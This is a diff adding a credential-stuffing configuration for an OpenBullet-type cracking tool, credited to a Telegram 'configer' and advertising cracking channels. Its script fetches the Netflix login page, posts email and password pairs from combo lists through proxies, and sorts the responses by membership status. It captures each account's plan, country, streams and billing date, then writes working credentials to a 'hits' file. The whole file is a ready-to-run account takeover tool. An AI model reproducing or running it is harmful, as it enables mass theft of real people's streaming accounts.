@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "Netflix",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-19T16:21:00.2373436+04:30",
+  "AdditionalInfo": "Channel : @Core_Crack & @Bruting",
+  "Author": "T.me/DrConfiger",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Please Join My Channels @Core_Crack & @Bruting",
+      "VariableName": "",
+      "Id": 2061535760
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.netflix.com/ph-en/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+
+#authURL PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" -> VAR "authURL" 
+
+#AUTH FUNCTION URLEncode "<authURL>" -> VAR "AUTH" 
+
+#lOGIN REQUEST POST "https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount" 
+  CONTENT "authURL=<AUTH>&email=<USER>&password=<PASS>&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Referer: https://www.netflix.com/ph-en/Login" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"unrecognized_email\"},\"" 
+    KEY "\"value\":\"incorrect_password\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER\"" 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER\"" 
+
+#currentPlanName PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> CAP "Sub" 
+
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#Screens PARSE "<SOURCE>" LR "\"maxStreams\":" "," -> CAP "Screens" 
+
+#Has_HD PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "Has HD" 
+
+#Has_UHD PARSE "<SOURCE>" LR "\"hasUHD\":" "," -> CAP "Has UHD" 
+
+#Billing PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" -> VAR "Billing" 
+
+#ReNew FUNCTION Replace "\\x2F" "/" "<Billing>" -> CAP "ReNew" 
+
+#@Core_Crack UTILITY File "NetflixHits(@Core_Crack).txt" Write "<USER>:<PASS> | Channel:@Core_Crack" -> VAR "@Core_Crack" 
+
